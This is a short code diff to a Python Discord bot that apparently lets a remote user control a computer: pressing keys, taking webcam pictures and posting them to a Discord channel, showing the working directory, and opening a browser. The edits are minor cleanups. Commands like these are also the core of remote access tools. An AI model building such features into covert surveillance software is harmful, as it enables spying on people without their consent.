@@ -19,7 +19,6 @@ import requests
 import yaml
 from PIL import ImageGrab
 import simpleaudio
-import ffmpeg
 import cv2
 from pydub import AudioSegment
 
@@ -72,9 +71,6 @@ except:
     traceback.print_exc()
     exit("No token specified")
 
-editor_filename = ""
-file_content = ""
-
 
 async def press(client, message: discord.Message, args: str):
     keys = args.split(" ")
@@ -104,6 +100,7 @@ async def cam(client:discord.Client, message:discord.Message, args:str):
     with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as temp:
         o = cv2.VideoCapture(0)
         s, img = o.read()
+        del s
         cv2.imwrite(temp.name, img)
         await message.channel.send(file=discord.File(temp.name))
         o.release()
@@ -338,7 +335,7 @@ async def pwd(client, message: discord.Message, args: str):
     :param args: str
     :type args: str
     """
-    await message.channel.send("Current directory is " + os.getcwd())
+    await message.channel.send(os.getcwd())
 
 
 async def browser(client, message: discord.Message, args: str):
